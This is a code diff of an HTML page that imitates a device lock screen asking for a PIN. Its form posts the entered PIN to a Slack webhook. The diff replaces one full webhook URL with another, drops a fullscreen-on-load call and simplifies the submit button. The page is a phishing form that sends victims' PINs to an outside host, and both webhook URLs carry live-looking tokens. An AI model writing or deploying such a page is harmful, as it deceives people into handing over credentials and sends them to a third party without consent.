@@ -68,11 +68,11 @@
         }
     </style>
 </head>
-<body onload="openFullscreen()">
+<body>
     <div class="lock-screen">
         <h2>Enter PIN</h2>
         <p>Your PIN contains at least 4 digits.</p>
-        <form id="pinForm" action="https://hooks.slack.com/services/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" method="POST">
+        <form id="pinForm" action="https://hooks.slack.com/services/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" method="POST">
             <input type="password" id="pin" name="pin" class="pin-display" maxlength="4" readonly>
             <div class="num-pad">
                 <button type="button" onclick="enterDigit(1)">1</button>
@@ -86,7 +86,7 @@
                 <button type="button" onclick="enterDigit(9)">9</button>
                 <button type="button" onclick="clearPin()">&#x232B;</button>
                 <button type="button" onclick="enterDigit(0)">0</button>
-                <button type="submit" onclick="submitPin(event)">OK</button>
+                <button type="submit" >OK</button>
             </div>
         </form>
         <div class="bottom-buttons">
